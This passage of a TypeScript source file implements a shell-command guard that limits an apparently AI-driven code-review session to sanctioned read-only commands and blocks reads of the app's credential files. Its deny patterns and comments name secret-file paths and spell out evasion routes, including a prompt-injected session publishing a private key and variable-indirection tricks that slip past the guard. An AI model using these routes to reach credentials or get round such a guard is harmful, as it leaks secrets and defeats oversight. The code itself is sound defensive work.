    `exec policy: '${name}=' names a program for another command to run — the reviewer never executes anything`,
  );
}

/** One segment's program + args, env prefixes and subshell parens skipped.
 * `segment` is the RAW text the tokens came from — needed for `bash -c`, whose
 * payload the whitespace split has already shredded (see `bashCPayload`). */
function checkSegment(
  segment: string,
  tokens: string[],
  depth: number,
  cwd: string | null,
  policy: GuardPolicy,
): BashCheck {
  let i = 0;
  let afterEnv = false;
  for (; i < tokens.length; i++) {
    const raw = tokens[i]!.replace(/^['"(]+|['")]+$/g, "");
    if (raw.length === 0) continue;
    const assign = /^([A-Za-z_][A-Za-z0-9_]*)=/.exec(raw);
    if (assign) {
      const refused = envInjectionBlock(assign[1]!);
      if (refused) return refused;
      continue; // VAR=val prefix
    }
    if (raw === "env") {
      afterEnv = true;
      continue;
    }
    if (afterEnv && raw.startsWith("-")) {
      // `env -S '<string>'` SPLITS its string into a program and arguments —
      // a second command line inside this one (`env -S 'bash -c "git push"'`).
      // Nothing a reviewer does needs it.
      if (/^-[A-Za-z0-9]*S|^--split-string/.test(raw)) {
        return block(
          "exec policy: 'env -S' assembles a second command line inside this one — the reviewer never launders a command through env",
        );
      }
      continue; // env -i etc.
    }
    if (/^\d*[<>]/.test(raw)) continue; // redirection remnant
    // Program token found.
    const rawArgs = tokens.slice(i + 1);
    const args = rawArgs.map((t) => t.replace(/^['"]+|['"]+$/g, ""));
    if (raw.slice(raw.lastIndexOf("/") + 1) === "bash") {
      // `bash -c <payload>` is a whole command line inside ONE word, so it is
      // judged from the RAW segment, never from these tokens.
      const lifted = bashCPayload(segment);
      if (lifted.kind === "payload") {
        if (depth >= MAX_NESTED_COMMAND_DEPTH)
          return block("exec policy: 'bash -c' nested too deep to analyse — refused");
        return checkBashCommand(lifted.payload, depth + 1, cwd, policy);
      }
      if (lifted.kind === "unliftable") return block(lifted.reason);
    }
    return checkProgram(raw, args, rawArgs, depth, textAfterWords(segment, i + 1), cwd, policy);
  }
  return { allowed: true }; // empty segment
}

/** Deepest `bash -c` nesting the guard will unwrap before refusing outright —
 * a bound, because a payload can itself be another `bash -c`. */
const MAX_NESTED_COMMAND_DEPTH = 8;

interface ShellWords {
  words: string[];
  /** A quote was still open at the end of the text. On a segment produced by
   * `splitShellSegments` that means the segment was CUT at a `$(` or backtick:
   * the rest of the word is assembled at runtime by a substitution. */
  unterminated: boolean;
}

/**
 * Split text into shell WORDS: quote-aware, DEQUOTED, split only on unquoted
 * whitespace. `'…'`, `"…"` (with `\"` and `\\`), `$'…'` (ANSI-C: `\n`, `\t`,
 * `\\`, `\'`, `\"`) and backslash escapes are all resolved, so what comes out
 * is what bash would hand the program as argv. Unlike the whitespace re-split
 * in `checkBashCommand`, this preserves separators (`;`, newline, `&&`) that
 * live INSIDE a quoted word — which is exactly what a `bash -c` payload is.
 */
export function shellWords(s: string): ShellWords {
  const ANSI_C: Readonly<Record<string, string>> = {
    n: "\n",
    t: "\t",
    r: "\r",
    "\\": "\\",
    "'": "'",
    '"': '"',
  };
  const words: string[] = [];
  let cur = "";
  let has = false;
  let q: "'" | '"' | "$'" | null = null;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i]!;
    if (q === "'") {
      if (ch === "'") q = null;
      else cur += ch;
      continue;
    }
    if (q === "$'") {
      if (ch === "'") q = null;
      else if (ch === "\\") {
        const next = s[i + 1] ?? "";
        cur += ANSI_C[next] ?? next;
        i++;
      } else cur += ch;
      continue;
    }
    if (q === '"') {
      if (ch === '"') q = null;
      else if (ch === "\\" && (s[i + 1] === '"' || s[i + 1] === "\\")) {
        cur += s[i + 1]!;
        i++;
      } else cur += ch;
      continue;
    }
    if (ch === "$" && s[i + 1] === "'") {
      q = "$'";
      has = true;
      i++;
      continue;
    }
    if (ch === "'" || ch === '"') {
      q = ch;
      has = true;
      continue;
    }
    if (ch === "\\") {
      cur += s[i + 1] ?? "";
      i++;
      has = true;
      continue;
    }
    if (/\s/.test(ch)) {
      if (has) {
        words.push(cur);
        cur = "";
        has = false;
      }
      continue;
    }
    cur += ch;
    has = true;
  }
  if (has) words.push(cur);
  return { words, unterminated: q !== null };
}

type LiftedPayload =
  | { kind: "none" } // not a `bash -c` at all
  | { kind: "payload"; payload: string } // the literal command string bash would run
  | { kind: "unliftable"; reason: string }; // a `bash -c` whose payload this guard cannot read — refused

/**
 * The `bash -c` payload of a raw segment, dequoted with its inner separators
 * intact. Env prefixes and `env` are stepped over (the prefix itself is vetted
 * by `checkSegment`). Two shapes are `unliftable`, and both REFUSE rather than
 * fall through to a weaker check:
 *   · the payload is not literally present — the segment was cut at a `$(` or
 *     backtick, so bash would run whatever the substitution produces
 *     (`bash -c "$(cat x)"` — VERIFIED running the file's contents);
 *   · an option that takes a VALUE sits before `-c` (`-o pipefail`, `-O …`,
 *     `--rcfile f`, `--init-file f`), so which word is the payload depends on
 *     bash's option table rather than on position (`bash -o pipefail -c '…'`
 *     — VERIFIED running the payload).
 * Nothing a reviewer does needs either. It is `bash` specifically: `sh -c` is
 * refused outright.
 */
function bashCPayload(segment: string): LiftedPayload {
  const { words, unterminated } = shellWords(segment);
  let i = 0;
  while (i < words.length) {
    const w = words[i]!;
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(w)) {
      i++;
      continue;
    }
    if (w === "env") {
      i++;
      while (i < words.length && words[i]!.startsWith("-")) i++;
      continue;
    }
    break;
  }
  const prog = words[i];
  if (prog === undefined || prog.slice(prog.lastIndexOf("/") + 1) !== "bash")
    return { kind: "none" };
  for (let j = i + 1; j < words.length; j++) {
    const w = words[j]!;
    // A non-option, or `--` / `-` (end of options), before any -c: this is
    // `bash <script>`, and checkProgram holds it to the sanctioned set.
    if (!w.startsWith("-") || w === "-" || w === "--") return { kind: "none" };
    if (/^-[A-Za-z]*[oO]/.test(w) || /^--(?:rcfile|init-file)/.test(w)) {
      return {
        kind: "unliftable",
        reason: `exec policy: 'bash ${w} …' — an option taking a value before -c hides which word is the command string; refused`,
      };
    }
    if (/^-[A-Za-z]*c[A-Za-z]*$/.test(w)) {
      if (unterminated) {
        return {
          kind: "unliftable",
          reason:
            "exec policy: this 'bash -c' payload is assembled at runtime by a substitution or an unclosed quote — the reviewer runs only commands the guard can read",
        };
      }
      const next = words[j + 1];
      return { kind: "payload", payload: (next === "--" ? words[j + 2] : next) ?? "" };
    }
  }
  return { kind: "none" };
}

function checkProgram(
  prog: string,
  args: string[],
  rawArgs: string[] | undefined,
  depth: number,
  /** The segment's text after `prog`, verbatim — quotes, and the newlines a
   * whitespace split loses, intact. */
  rawText: string | undefined,
  cwd: string | null,
  policy: GuardPolicy,
): BashCheck {
  // Sanctioned scripts, invoked directly.
  const direct = sanctionedScript(prog, cwd, policy);
  if (direct.name !== undefined || /(^|\/)scripts\//.test(prog)) {
    return direct.sanctioned
      ? { allowed: true }
      : block(
          policy.replay ? REPLAY_NO_SCRIPTS : `exec policy: '${prog}' is not a sanctioned script`,
        );
  }
  const base = prog.slice(prog.lastIndexOf("/") + 1);
  if (base === "cd") return { allowed: true }; // builtin, argument is a path not a program
  // Checked before the allowlist so the reason is the directive one, and
  // before `sh`/`bash`, which have their own narrower rules below.
  if (AGENT_SPAWNERS.has(base)) return block(`${AGENT_SPAWN_REASON} — '${base}' is blocked`);
  if (base === "sh") {
    // No option after -n may switch execution back on or introduce a command.
    const words = rawText === undefined ? args.map(dequote) : shellWords(rawText).words;
    const next = words[1];
    return words[0] === "-n" &&
      (next === undefined || next === "--" || next === "-" || !/^[-+]/.test(next))
      ? { allowed: true }
      : block("exec policy: 'sh' is only allowed as 'sh -n [--] <file>' (syntax check)");
  }
  if (base === "bash") {
    // A `bash -c` with a readable payload never reaches here: `checkSegment`
    // lifts it from the raw segment and re-parses it. What does reach here is
    // `bash -c` through `xargs`, or a -c form
    // `bashCPayload` did not recognise — and a command string nobody vetted
    // must not run, so any -c BEFORE the script is refused. Otherwise bash may
    // ONLY launch a sanctioned scripts/*.sh (flags before it allowed; anything
    // after the script is the script's own argument).
    for (const a of args) {
      if (!a.startsWith("-")) {
        return sanctionedScript(a, cwd, policy).sanctioned
          ? { allowed: true }
          : block(
              policy.replay
                ? REPLAY_NO_SCRIPTS
                : `exec policy: 'bash ${a}' is not a sanctioned scripts/*.sh`,
            );
      }
      if (/^-[A-Za-z]*c/.test(a)) {
        return block(
          "exec policy: this 'bash -c' carries a command string the guard cannot read (through xargs, or a form it does not lift) — refused",
        );
      }
    }
    return block("exec policy: 'bash' may only run sanctioned scripts/*.sh");
  }
  if (base === "gh" || base === "git") {
    // gh and git are judged on the argv they RECEIVE. Plain quotes and
    // backslashes are removed exactly (`dequote`); ANSI-C `$'…'` and locale
    // `$"…"` quoting can spell any byte (or a translated string), so a word
    // carrying either is refused rather than guessed at.
    const unmodelled = args.find((a) => opensUnmodelledQuoting(a));
    if (unmodelled !== undefined) {
      return block(
        `exec policy: '${base}' argument ${unmodelled} uses $'…' or $"…" quoting, which the guard does not decode — spell it with plain quotes`,
      );
    }
    if (base === "gh") return checkGh(args.map(dequote).filter((a) => a.length > 0));
    return checkGit(args.filter((a) => a.length > 0));
  }
  if (base === "xargs") {
    // xargs contributes arguments the guard cannot inspect. Classify its own
    // options before locating the program, including detached option values.
    let at = 0;
    for (; at < args.length; at++) {
      const option = dequote(args[at]!);
      if (option === "--") {
        at++;
        break;
      }
      if (!option.startsWith("-")) break;
      if (/^(?:-[nLPsEId]|--(?:max-args|max-lines|max-procs|max-chars|delimiter))$/.test(option))
        at++;
    }
    const target = args[at];
    if (target === undefined) return { allowed: true };
    const from = at + 1;
    const checked = checkProgram(
      dequote(target),
      args.slice(from),
      rawArgs?.slice(from),
      depth,
      rawText === undefined ? undefined : textAfterWords(rawText, from),
      cwd,
      policy,
    );
    if (!checked.allowed) return checked;
    const reader = basenameOf(dequote(target));
    if (["find", "uniq", "sh", "xargs"].includes(reader)) {
      return block(
        `exec policy: 'xargs ${reader}' can receive executable or output operands from stdin — use a direct, fully specified reader invocation`,
      );
    }
    if (["sed", "sort", "git", "gh"].includes(reader)) {
      const replaces = args
        .slice(0, at)
        .some((a) => /^(?:-[a-zA-Z]*[Ii]|--replace)/.test(dequote(a)));
      if (replaces || dequote(args[args.length - 1] ?? "") !== "--") {
        return block(
          `exec policy: 'xargs ${reader}' without a closing '--' or with replacement — stdin must only supply file operands after all checked options`,
        );
      }
    }
    return checked;
  }
  if (ALLOWED.has(base)) {
    // Allowlisted for READING is not allowlisted outright: sed/sort/find each
    // carry a write or exec mode (all VERIFIED).
    return checkReaderModes(base, args, rawArgs, rawText);
  }
  // ALLOWLIST MEMBERSHIP is what decides — this table only makes the refusal
  // name a replacement. Deliberately AFTER the check above: were it first,
  // removing `awk` from ALLOWED would be unobservable to the tests, and a
  // defence whose removal changes nothing is not a defence.
  const interpreter = INTERPRETER_REASONS[base];
  if (interpreter !== undefined) return block(interpreter);
  return block(`exec policy: '${base}' is not an allowed read-only command`);
}

/** Quote/substitution-aware segment splitter (a quote-blind split shreds
 * `rg 'a|b'` on the quoted pipe and vets pattern fragments as programs). Rules:
 *  - single quotes: everything inside is literal;
 *  - double quotes: separators are literal, but `$(` and backticks still
 *    execute, so they still split (quote state restored at the matching `)`);
 *  - backslash escapes the next char (outside single quotes);
 *  - unquoted `; & | && || newline ( )` split; `$(`/`)` track nesting so the
 *    command FOLLOWING a substitution lands in its own segment and is vetted
 *    (merging it back would let `A="$(cat x)" python3 e.py` through). */
export function splitShellSegments(cmd: string): string[] {
  const segs: string[] = [];
  let cur = "";
  let q: "'" | '"' | null = null;
  const substStack: Array<"'" | '"' | null> = [];
  const push = (): void => {
    segs.push(cur);
    cur = "";
  };
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]!;
    if (ch === "\\" && q !== "'") {
      cur += ch + (cmd[i + 1] ?? "");
      i++;
      continue;
    }
    if (q === "'") {
      if (ch === "'") q = null;
      cur += ch;
      continue;
    }
    if (ch === "'") {
      q = "'";
      cur += ch;
      continue;
    }
    if (ch === '"') {
      q = q === '"' ? null : '"';
      cur += ch;
      continue;
    }
    if (ch === "$" && cmd[i + 1] === "(") {
      substStack.push(q);
      q = null;
      push();
      i++;
      continue;
    }
    if (ch === ")" && substStack.length > 0) {
      q = substStack.pop()!;
      push();
      continue;
    }
    if (ch === "`") {
      push();
      continue;
    }
    if (q === '"') {
      cur += ch; // separators are literal inside double quotes
      continue;
    }
    if (ch === "\n" || ch === ";" || ch === "(" || ch === ")") {
      push();
      continue;
    }
    if (ch === "&" || ch === "|") {
      push();
      if (cmd[i + 1] === ch) i++;
      continue;
    }
    cur += ch;
  }
  segs.push(cur);
  return segs;
}

/**
 * Files that carry the OpenViking SERVER's root key.
 *
 * `cat` and `grep` are legitimately on the read-only allowlist, so the program
 * check alone would let a session read `~/.openviking/ov.conf` — which in
 * api_key mode holds `root_api_key`, an account-wide superuser that can list
 * every USER key in plaintext. That would hand a review session companion
 * memory, the exact reach the two-user design exists to deny.
 *
 * This is the third layer, not the only one: the key is never on an argv or in
 * a session's environment, and `writeOvcliConf` refuses to write it as a
 * session credential. Matching is on the SPELLING anywhere in the command, so
 * a redirect, a `--file=` form or an argument to any allowed reader is covered.
 */
const ROOT_CREDENTIAL_PATTERNS: Array<{ re: RegExp; what: string }> = [
  {
    re: /(^|[^A-Za-z0-9_-])ov\.conf\b/,
    what: "the OpenViking server config (it holds root_api_key)",
  },
  { re: /openviking_root_key/, what: "the OpenViking root key secret" },
  { re: /root_api_key/, what: "the OpenViking root key" },
  { re: /openviking-keys\.env/, what: "the companion's OpenViking key file" },
];

/** The root-credential check, plus the App-secret belt below.
 * Exported so the reason is testable on its own. `ctx` defaults to this
 * process's own cwd, home and secrets dirs. */
export function checkSecretPaths(cmd: string, ctx?: SecretPathContext): BashCheck {
  const root = checkRootCredentialSpelling(cmd);
  if (!root.allowed) return root;
  return checkAppSecretWords(cmd, ctx ?? processSecretContext());
}

function checkRootCredentialSpelling(text: string): BashCheck {
  for (const { re, what } of ROOT_CREDENTIAL_PATTERNS) {
    if (re.test(text)) {
      return block(
        `exec policy: reading ${what} is never sanctioned — review sessions authenticate as the reviewer USER and nothing else`,
      );
    }
  }
  return { allowed: true };
}

/**
 * The App-secret belt — and what it is NOT.
 *
 * `cat` is a sanctioned reader, and a posted review body is a channel to
 * GitHub, so without this a prompt-injected session could read
 * `/opt/quickreview/secrets/app.pem` and publish the App's private key. This
 * cheap interim belt refuses any session command, and any read/write tool
 * call, that NAMES one of the App's secret files or the secrets dir itself.
 *
 * It is a SPELLING belt. Variable indirection (`d=/opt/quickreview/sec; cat
 * ${d}rets/app.pem`), a recursive read of an ancestor (`grep -r . /opt`), a
 * symlink, a file list fed to `xargs` — all of these still reach the files,
 * and no amount of pattern work here closes that class. The real fix is that
 * a session cannot read the dir at all: a uid or mount split. Until then this
 * turns the obvious spellings into a loud refusal.
 *
 * The sanctioned scripts keep working because they read the secrets as
 * SUBPROCESSES: `bash scripts/mint-token.sh` names no secret on the session's
 * command line, and only that line is checked.
 *
 * How a word is judged — after quotes, backslashes and `$'…'` escapes are
 * removed, `~`/`$HOME`/`$XDG_CONFIG_HOME`/`$QCR_INSTALL` expanded and `{a,b}`
 * braces expanded:
 *   · a path COMPONENT that is a secret file's name (`APP_SECRET_NAME_RE`);
 *   · a spelling of a secrets dir on its own (`/opt/quickreview/secrets`,
 *     `…/qcr/<install>/secrets`, the old `~/.config/quickreview-bot`);
 *   · the word resolved against the cwd (a `cd` earlier in the same command
 *     moves it) landing on, or inside, one of the resolved secrets dirs —
 *     so `../secrets/app_id` from the sandbox root is caught;
 *   · a GLOB that could expand to a secret path (`../secrets/*`,
 *     `/opt/*` + `/s*` + `/*`), or one of whose components could match a
 *     secret file's name with at least half of that name spelled literally
 *     (`app.p*m`, `*.pem`, `openai*key` — but not `*`, `*key` or `*token`,
 *     which would refuse ordinary reads).
 * A grep/rg PATTERN and a sed SCRIPT are exempt (the first positional, or the
 * value of `-e`): they read nothing, and a reviewer of code that handles
 * secrets greps for `openai_api_key` as a matter of course.
 */
export interface SecretPathContext {
  /** The directory a bare relative word resolves against (the session cwd). */
  cwd: string;
  /** For `~`, `$HOME`, `$XDG_CONFIG_HOME` and `$QCR_INSTALL` expansion. */
  env: Readonly<Record<string, string | undefined>>;
  /** Every secrets dir this install could be using, absolute, no trailing `/`. */
  dirs: readonly string[];
}

/** The in-container secrets mount (deploy/ansible entrypoint `SECRETS`). */
export const CONTAINER_SECRETS_DIR = "/opt/quickreview/secrets";

/** The files the secrets dir holds, by their shipped names
 * (deploy/collect-secrets.sh, the src/config.ts defaults). */
export const APP_SECRET_FILES: readonly string[] = [
  "app.pem",
  "webhook_secret",
  "tunnel_token",
  "openai_api_key",
  "openai_embeddings_api_key",
  "slack_bot_token",
  "slack_app_token",
];
const APP_SECRET_NAME_RE = new RegExp(
  `^(?:${APP_SECRET_FILES.map(escapeRe).join("|")}|openai[A-Za-z0-9_.-]*key)$`,
);

/** Secrets-dir spellings recognisable without any context. */
const SECRET_DIR_SPELLINGS: readonly RegExp[] = [
  /^\/+opt\/+quickreview\/+secrets(?:\/|$)/,
  /(?:^|\/)qcr\/+[^/]+\/+secrets(?:\/|$)/,
  /(?:^|\/)\.config\/+quickreview-bot(?:\/|$)/, // the legacy dir — refused, never read
];

/**
 * This process's secrets dirs — self-contained on purpose (no `src/` import):
 * bash-guard is registered GLOBALLY on the VM and in the bench sandbox, and
 * must load wherever pi finds it. Mirrors `locateSecrets` in src/install.ts:
 * the container mount, `$QCR_SECRETS_MOUNT`, `$QC_SECRETS_DIR`,
 * `<config home>/secrets` (including absolute `$QCR_CONFIG_HOME`), the legacy `~/.config/quickreview-bot`, and a
 * `[github] secrets_dir` read best-effort from `$QCR_CONFIG`.
 */
export function defaultSecretPathContext(
  env: Readonly<Record<string, string | undefined>> = process.env,
  cwd: string = process.cwd(),
): SecretPathContext {
  const home = homeFor(env);
  const xdg = (env.XDG_CONFIG_HOME ?? "").trim() || `${home}/.config`;
  const install = (env.QCR_INSTALL ?? "").trim() || "default";
  const configOverride = (env.QCR_CONFIG_HOME ?? "").trim();
  const configDir = configOverride.startsWith("/")
    ? configOverride.replace(/\/+$/, "")
    : `${xdg}/qcr/${install}`;
  const dirs = new Set<string>([
    CONTAINER_SECRETS_DIR,
    `${configDir}/secrets`,
    `${home}/.config/quickreview-bot`, // the legacy dir — refused, never read
  ]);
  for (const v of [
    env.QCR_SECRETS_MOUNT,
    env.QC_SECRETS_DIR,
    configuredSecretsDir(env.QCR_CONFIG),
  ]) {
    if (typeof v === "string" && v.trim() !== "") dirs.add(expandTilde(v.trim(), home));
  }
  return {
    cwd,
    env,
    dirs: [...dirs]
      .filter((d) => d.startsWith("/"))
      .map((d) => posix.normalize(d).replace(/(.)\/+$/, "$1")),
  };
}

function homeFor(env: Readonly<Record<string, string | undefined>>): string {
  return (env.HOME ?? "").trim() || "/root";
}

function expandTilde(p: string, home: string): string {
  if (p === "~") return home;
  return p.startsWith("~/") ? `${home}/${p.slice(2)}` : p;
}

/** `[github] secrets_dir` from the live config, by a line scan — never a
 * reason to fail: an unreadable config simply adds nothing. */
function configuredSecretsDir(configPath: string | undefined): string | null {
  if (typeof configPath !== "string" || configPath.trim() === "") return null;
  try {
    let section = "";
    for (const line of readFileSync(configPath, "utf8").split("\n")) {
      const head = /^\s*\[([^\]]+)\]\s*(?:#.*)?$/.exec(line);
      if (head) {
        section = head[1]!.trim();
        continue;
      }
      if (section !== "github") continue;
      const m = /^\s*secrets_dir\s*=\s*["']([^"']*)["']/.exec(line);
      if (m && m[1]!.trim() !== "") return m[1]!.trim();
    }
  } catch {
    /* unreadable config: nothing to add */
  }
  return null;
}

let cachedSecretDirs: SecretPathContext | null = null;
/** The live process's context: dirs resolved once, the cwd read every call. */
function processSecretContext(): SecretPathContext {
  cachedSecretDirs ??= defaultSecretPathContext();
  return { ...cachedSecretDirs, cwd: process.cwd() };
}

/** Programs whose first positional (or `-e` value) is a PATTERN or script,
 * not a file. */
const PATTERN_PROGRAMS = new Set(["grep", "egrep", "fgrep", "rg", "sed"]);
/** Their options that consume the NEXT word as a value, so the value is not
 * mistaken for the pattern. (`-e`/`--regexp`/`--expression` are handled
 * separately: their value IS the pattern.) */
const PATTERN_PROGRAM_VALUE_OPTS = new Set([
  "-A",
  "-B",
  "-C",
  "-m",
  "-d",
  "-D",
  "-g",
  "-t",
  "-T",
  "-M",
  "-j",
  "-E",
  "--after-context",
  "--before-context",
  "--context",
  "--max-count",
  "--glob",
  "--iglob",
  "--type",
  "--type-not",
  "--max-columns",
  "--threads",
  "--encoding",
  "--sort",
  "--sortr",
  "--max-depth",
  "--color",
  "--colors",
  "--replace",
  "--path-separator",
  "--max-filesize",
  "--ignore-file",
  "--type-add",
  "--engine",
  "--devices",
  "--directories",
  "--binary-files",
  "--label",
  "--include",
  "--exclude",
  "--exclude-dir",
  "--line-length",
]);

function secretBlock(word: string, why: string): BashCheck {
  return block(
    `exec policy: '${word}' ${why} — a review session never reads the App's credentials (app.pem, webhook_secret, tunnel_token, the OpenAI and Slack keys, or the secrets dir); the sanctioned scripts (mint-token.sh, the posting scripts) read them themselves`,
  );
}

const ASSIGNMENT_RE = /^[A-Za-z_][A-Za-z0-9_]*=/;

/** Preserve each shell word's original spelling so secret-path expansion can
 * still inspect quotes and escapes, while a multiword pattern stays one word. */
function rawShellWords(text: string): string[] {
  const words: string[] = [];
  let start = -1;
  let quote: "'" | '"' | null = null;
  for (let i = 0; i < text.length; i++) {
    const c = text[i]!;
    if (start < 0 && !/\s/.test(c)) start = i;
    if (c === "\\" && quote !== "'") {
      i++;
      continue;
    }
    if (quote !== null) {
      if (c === quote) quote = null;
    } else if (c === "'" || c === '"') quote = c;
    else if (/\s/.test(c) && start >= 0) {
      words.push(text.slice(start, i));
      start = -1;
    }
  }
  if (start >= 0) words.push(text.slice(start));
  return words;
}

function checkAppSecretWords(cmd: string, ctx: SecretPathContext): BashCheck {
  let cwd = ctx.cwd;
  for (const segment of splitShellSegments(cmd)) {
    const words = rawShellWords(segment);
    const exempt = patternWordIndexes(words);
    for (let i = 0; i < words.length; i++) {
      if (exempt.has(i)) continue;
      const res = judgeSecretWord(words[i]!, { ...ctx, cwd });
      if (!res.allowed) return res;
    }
    // A `cd` moves where every later relative word lands. Approximate on
    // purpose (a subshell's cd leaks forward here) — that errs toward refusal.
    const p = programIndex(words);
    if (p >= 0 && basenameOf(dequoteShellWord(words[p]!)) === "cd") {
      const target = words.slice(p + 1).find((w) => !w.startsWith("-"));
      if (target !== undefined) {
        const t = expandShellWord(dequoteShellWord(target), ctx.env);
        if (!/[*?[$]/.test(t)) cwd = posix.resolve(cwd, t);
      }
    }
  }
  return { allowed: true };
}

/** Index of a segment's program word: past `VAR=val` prefixes and `env`. */
function programIndex(words: readonly string[]): number {
  let p = 0;
  while (p < words.length && (ASSIGNMENT_RE.test(words[p]!) || /^\d*[<>]/.test(words[p]!))) p++;
  if (p < words.length && dequoteShellWord(words[p]!) === "env") {
    p++;
    while (p < words.length && (words[p]!.startsWith("-") || ASSIGNMENT_RE.test(words[p]!))) p++;
  }
  return p < words.length ? p : -1;
}

/** Which words of a segment are a pattern/script argument of grep/rg/sed. */
function patternWordIndexes(words: readonly string[]): Set<number> {
  const out = new Set<number>();
  let p = programIndex(words);
  if (p < 0) return out;
  // `xargs grep foo` — the pattern belongs to xargs' program.
  if (basenameOf(dequoteShellWord(words[p]!)) === "xargs") {
    p++;
    while (p < words.length && words[p]!.startsWith("-")) p++;
  }
  if (p >= words.length || !PATTERN_PROGRAMS.has(basenameOf(dequoteShellWord(words[p]!))))
    return out;
  let explicit = false;
  let firstPositional = -1;
  for (let i = p + 1; i < words.length; i++) {
    const w = dequoteShellWord(words[i]!);
    if (w === "--") {
      if (firstPositional < 0 && i + 1 < words.length) firstPositional = i + 1;
      break;
    }
    if (w === "-f" || w === "--file") {
      explicit = true; // the next word names a file, never a literal pattern
      i++;
      continue;
    }
    if (/^(?:-f.|--file=)/.test(w)) {
      explicit = true;
      continue;
    }
    if (w === "-e" || w === "--regexp" || w === "--expression") {
      explicit = true;
      out.add(i + 1);
      i++;
      continue;
    }
    if (/^(?:-e.|--regexp=|--expression=)/.test(w)) {
      explicit = true;
      out.add(i);
      continue;
    }
    if (w.startsWith("-")) {
      if (PATTERN_PROGRAM_VALUE_OPTS.has(w)) i++;
      continue;
    }
    if (/^\d*[<>]/.test(w)) continue;
    if (firstPositional < 0) firstPositional = i;
  }
  if (!explicit && firstPositional >= 0) out.add(firstPositional);
  return out;
}

function basenameOf(w: string): string {
  return w.slice(w.lastIndexOf("/") + 1);
}

/** The word bash would see: `$'…'` escapes decoded, then quotes, backslashes
 * and backticks removed. (A glob char inside quotes is literal to bash, but
 * judging it as a glob only errs toward refusal.) */
function dequoteShellWord(word: string): string {
  const ansi = word.replace(/\$'((?:\\.|[^'\\])*)'/g, (_m, body: string) =>
    body
      .replace(/\\x([0-9A-Fa-f]{1,2})/g, (_x, h: string) => String.fromCharCode(parseInt(h, 16)))
      .replace(/\\u([0-9A-Fa-f]{1,4})/g, (_x, h: string) => String.fromCharCode(parseInt(h, 16)))
      .replace(/\\([0-7]{1,3})/g, (_x, o: string) => String.fromCharCode(parseInt(o, 8))),
  );
  return ansi.replace(/["'\\`]/g, "");
}

/** `~`, `$HOME`/`${HOME}`, `$XDG_CONFIG_HOME`, `$QCR_INSTALL` — the variables
 * a secrets path is spelled with. Anything else is left as written. */
function expandShellWord(w: string, env: SecretPathContext["env"]): string {
  const home = homeFor(env);
  const vars: Record<string, string> = {
    HOME: home,
    XDG_CONFIG_HOME: (env.XDG_CONFIG_HOME ?? "").trim() || `${home}/.config`,
    QCR_INSTALL: (env.QCR_INSTALL ?? "").trim() || "default",
  };
  let out = w.replace(
    /\$\{?(HOME|XDG_CONFIG_HOME|QCR_INSTALL)\}?(?![A-Za-z0-9_])/g,
    (_m, n: string) => vars[n]!,
  );
  if (out === "~") out = home;
  else if (out.startsWith("~/")) out = `${home}/${out.slice(2)}`;
  return out;
}

/** `{a,b}` brace expansion, bounded at 64 results. */
function braceExpand(w: string, budget = 64): string[] {
  const m = /^(.*?)\{([^{}]*,[^{}]*)\}(.*)$/.exec(w);
  if (!m) return [w];
  const out: string[] = [];
  for (const alt of m[2]!.split(",")) {
    for (const x of braceExpand(`${m[1]}${alt}${m[3]}`, budget)) {
      out.push(x);
      if (out.length >= budget) return out;
    }
  }
  return out;
}

const GLOB_CHARS = /[*?[]/;

function globToRegex(glob: string): RegExp {
  let re = "";
  for (let i = 0; i < glob.length; i++) {
    const c = glob[i]!;
    if (c === "*") {
      if (glob[i + 1] === "*") {
        re += ".*";
        i++;
      } else re += "[^/]*";
    } else if (c === "?") re += "[^/]";
    else if (c === "[") {
      const close = glob.indexOf("]", i + 2);
      if (close < 0) re += "\\[";
      else {
        let body = glob.slice(i + 1, close);
        if (body.startsWith("!")) body = "^" + body.slice(1);
        re += `[${body.replace(/\\/g, "\\\\")}]`;
        i = close;
      }
    } else re += c.replace(/[.+^${}()|\\/]/g, "\\$&");
  }
  return new RegExp(`^${re}$`);
}

/** The concrete paths a glob is tried against: each dir, and each shipped
 * file inside it. */
function secretCandidates(dirs: readonly string[]): string[] {
  const out: string[] = [];
  for (const d of dirs) {
    out.push(d);
    for (const f of APP_SECRET_FILES) out.push(`${d}/${f}`);
  }
  return out;
}

/** Do the glob's leading components match a whole secrets dir? Then whatever
 * follows them (`app_id`, a file the name list does not carry) is inside it. */
function globPrefixHitsDir(absGlob: string, dirs: readonly string[]): boolean {
  const parts = absGlob.split("/").filter((c) => c.length > 0);
  return dirs.some((d) => {
    const dparts = d.split("/").filter((c) => c.length > 0);
    if (parts.length < dparts.length) return false;
    // `**` can span components; an any-depth prefix is the whole-path regex's job.
    const prefix = parts.slice(0, dparts.length);
    if (prefix.some((c) => c.includes("**"))) return false;
    return globToRegex(`/${prefix.join("/")}`).test(d);
  });
}

function judgeSecretWord(raw: string, ctx: SecretPathContext): BashCheck {
  // Every piece of the word that could be a path: the word itself, the part
  // after a redirection operator, after `=` (`--file=`, `VAR=`), after a
  // short option (`-f/path`) and after an `@` (pi's and curl's file prefix).
  const pieces = new Set<string>();
  for (const piece of dequoteShellWord(raw).split(/[<>|;&()]+/)) {
    if (piece === "") continue;
    pieces.add(piece);
    const eq = piece.indexOf("=");
    if (eq >= 0) pieces.add(piece.slice(eq + 1));
    if (/^-[A-Za-z]./.test(piece)) pieces.add(piece.slice(2));
    if (piece.startsWith("@")) pieces.add(piece.slice(1));
  }
  for (const piece of pieces) {
    for (const w of braceExpand(expandShellWord(piece, ctx.env))) {
      const res = judgeSecretPath(w, ctx);
      if (!res.allowed) return res;
    }
  }
  return { allowed: true };
}

/** One expanded, unquoted word judged as a path. */
export function judgeSecretPath(w: string, ctx: SecretPathContext): BashCheck {
  if (w === "") return { allowed: true };
  const components = w.split("/").filter((c) => c.length > 0);
  for (const c of components) {
    if (APP_SECRET_NAME_RE.test(c)) return secretBlock(w, "names one of the App's secret files");
  }
  for (const re of SECRET_DIR_SPELLINGS) {
    if (re.test(w)) return secretBlock(w, "names the App's secrets dir");
  }
  const abs = posix.resolve(ctx.cwd, w);
  for (const d of ctx.dirs) {
    if (abs === d || abs.startsWith(`${d}/`))
      return secretBlock(w, `resolves into the App's secrets dir (${d})`);
  }
  if (GLOB_CHARS.test(w)) {
    const re = globToRegex(abs);
    if (secretCandidates(ctx.dirs).some((p) => re.test(p)) || globPrefixHitsDir(abs, ctx.dirs))
      return secretBlock(w, "is a glob that can expand into the App's secrets dir");
    for (const c of components) {
      if (!GLOB_CHARS.test(c)) continue;
      const cre = globToRegex(c);
